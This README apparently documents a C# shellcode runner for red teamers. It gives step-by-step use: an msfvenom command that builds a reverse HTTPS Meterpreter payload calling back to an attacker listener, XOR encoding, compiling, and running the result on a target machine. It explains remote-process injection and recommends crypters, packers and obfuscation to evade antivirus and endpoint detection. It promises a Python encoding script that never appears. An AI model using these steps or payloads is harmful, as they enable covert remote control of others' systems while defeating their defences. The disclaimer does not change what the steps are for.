# Process Injection - Shellcode Runner with XOR Encoding

## Overview

This project demonstrates how to execute XOR-encoded shellcode using C#. It outlines the process of generating shellcode with `msfvenom`, encoding it with a custom XOR key, and executing it in memory to avoid static detection. The purpose is to help red teamers and penetration testers understand basic obfuscation and runtime execution techniques, while keeping an eye on evasion strategies.

## Key Features
- Executes XOR-encoded shellcode in memory.
- Uses a customizable XOR key for encoding.
- Demonstrates basic payload obfuscation techniques.
- Bypasses static detection with encoded payloads.
- Allows further customization using crypters for runtime obfuscation.

## **Key Injection Mechanism**
Opening the Target Process:

The target process is opened using OpenProcess with the All access flag.
Memory Allocation:

The VirtualAllocEx function allocates memory in the remote process (the target of injection).
Writing Payload:

The shellcode (malicious code) is written into the allocated memory space of the target process using WriteProcessMemory.
Executing Payload:

A new thread is created within the target process using CreateRemoteThread, which points to the shellcode's memory location to execute it.
This is typical of many malware or exploit delivery mechanisms, where the payload (in this case, msfvenom generated shellcode) is remotely injected and executed to compromise a target system.
## Steps to Use

### 1. Generate XOR-Encoded Shellcode

Use `msfvenom` to generate the shellcode. This example uses a reverse HTTPS Meterpreter payload, but any payload can be encoded:

```bash
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=YOUR_IP LPORT=YOUR_PORT EXITFUNC=thread -f csharp
```

This command generates the raw shellcode in C# format, which will then be XOR-encoded.

### 2. XOR Encoding Process

To enhance evasion and bypass static detection by antivirus solutions, XOR encoding is already applied to the shellcode. Use a simple XOR encoding script to modify the payload before inserting it into the C# shellcode runner. A custom key such as `0xfa` is used for this encoding. Here's an example Python script to XOR-encode the shellcode:
Also, the same rule should be applied for the encryption and the decrption of the shellcode during the runtime process. The output from this script (Helper) is your XOR-encoded payload, which you will then insert into the shellcode runner.

### 3. Compile and Execute

After placing the encoded payload into the shellcode runner, compile the code using the .NET CLI or Visual Studio. Use the following command to compile from the command line:

```bash
csc runner.cs
```

This produces an executable (`runner.exe`) that will execute the XOR-decoded shellcode in memory.

### 4. Run the Executable

Once compiled, run the executable on the target machine:

```bash
./runner.exe
```

Ensure the payload is correctly configured for your listener (e.g., a Meterpreter listener on your attack machine).

## Improving Evasion

### Crypters

To enhance the evasion capability of this shellcode runner, crypters can be employed. Crypters encrypt or obfuscate executables to help them bypass antivirus and endpoint detection systems.

#### What is a Crypter?

A crypter modifies the binary or the shellcode itself, using encryption or obfuscation techniques to make it undetectable by static analysis tools. At runtime, the crypter decrypts or decodes the payload, allowing it to execute without triggering alerts.

### Crypter Tools

- **Veil Framework**: A popular tool for generating payloads that bypass antivirus detection.
- **Hyperion**: An open-source crypter that applies encryption at runtime to evade detection.
- **Custom Crypters**: For maximum evasion, building a custom crypter with unique algorithms can provide better results.

### Other Evasion Techniques

1. **Obfuscation**: Randomizing variable names, altering code structure, or introducing junk code can help avoid static analysis detection.
2. **Dynamic Encoding**: Encoding and decoding the payload dynamically at runtime ensures the code remains hidden from static scans.
3. **Packing**: Using packers (such as UPX) compresses and obscures the executable, adding another layer of protection against analysis.

## Legal Disclaimer

This project is intended for educational purposes only. Always ensure you have proper authorization before using any tools or techniques demonstrated here on systems or networks. Unauthorized access or testing of systems without consent is illegal.

## Conclusion

This shellcode runner serves as a basic framework for red teamers to understand the process of obfuscating and executing payloads in memory. It is intended for use in ethical hacking scenarios where stealth and evasion are critical. Further enhancements like crypters and dynamic obfuscation can be applied to improve its ability to bypass advanced security mechanisms.

---

